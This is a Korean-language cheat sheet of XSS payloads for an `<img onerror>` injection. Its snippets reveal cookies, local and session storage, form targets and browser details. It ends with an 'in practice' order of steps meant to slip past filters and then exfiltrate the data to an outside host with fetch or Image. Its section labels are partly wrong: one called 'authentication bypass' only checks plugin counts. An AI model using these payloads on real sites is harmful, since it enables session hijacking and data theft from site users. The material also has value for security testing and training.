# XSS 정보 수집 페이로드

## 개요

`<img src=x onerror="...">` 형태의 XSS에서 실행해 페이지·브라우저·저장소 정보를 수집하는 JavaScript 페이로드 모음이다. 각 스니펫은 단독으로 실행해 결과를 확인한다.

## 1. 지금 이 페이지/도메인 확인

```js
alert(document.domain);
```

```js
alert(location.href);
```

```js
alert(document.title);
```

## 2. 쿠키 확인

```js
alert(document.cookie);
```

쿠키에 session, token, auth, remember_me, phpsessid, JSESSIONID 같은 값이 있으면 위험하다.

## 3. 쿠키에 HttpOnly가 없는지 확인

```js
try {
  document.cookie = "probe=1";
  alert(
    document.cookie.indexOf("probe") !== -1
      ? "cookie_write_ok"
      : "cookie_write_blocked",
  );
} catch (e) {
  alert("cookie_write_error");
}
```

`cookie_write_ok`가 뜨면 HttpOnly가 없거나, 이 맥락에서 `document.cookie`로 읽을 수 있는 쿠키가 있을 수 있다.

## 4. 페이지 내부 정보 수집

```js
alert(navigator.userAgent);
```

```js
alert(navigator.language);
```

```js
alert(screen.width + "," + screen.height);
```

```js
alert(screen.colorDepth);
```

## 5. 저장된 정보 확인

```js
alert(localStorage.length);
```

```js
try {
  alert(JSON.stringify(localStorage));
} catch (e) {
  alert("localStorage_error");
}
```

```js
try {
  alert(sessionStorage.length);
} catch (e) {
  alert("sessionStorage_error");
}
```

## 6. 폼/입력값/데이터 수집

```js
alert(document.forms.length);
```

```js
for (var i = 0; i < document.forms.length; i++) {
  alert(
    "FORM " +
      i +
      ": " +
      document.forms[i].action +
      " | " +
      document.forms[i].method,
  );
}
```

```js
alert(document.URL);
```

```js
alert(document.referrer);
```

## 9. 인증 우회 확인

```js
alert(navigator.onLine);
```

```js
alert(navigator.plugins.length);
```

```js
alert(navigator.mimeTypes.length);
```

## 10. 정상 동작 확인용

```js
alert("test");
```

```js
alert(1);
```

```js
alert(true);
```

## 실전 추천 순서

처음부터 너무 많이 넣으면 필터에 걸리거나 브라우저가 이상해질 수 있다. 보통 이 순서가 좋다.

```js
alert("1"); // 실행 확인
alert(document.domain); // 어떤 페이지인지 확인
alert(document.cookie); // 쿠키 확인
alert(navigator.userAgent); // 사용자 환경 확인
alert(document.forms.length); // 폼 개수 확인
alert(document.URL); // 현재 URL 확인
```

이렇게 3단계까지 끝나면, 그다음부터는 `document.cookie` 말고 `fetch`/`Image`로 외부로 보내는 흐름이 좋다.

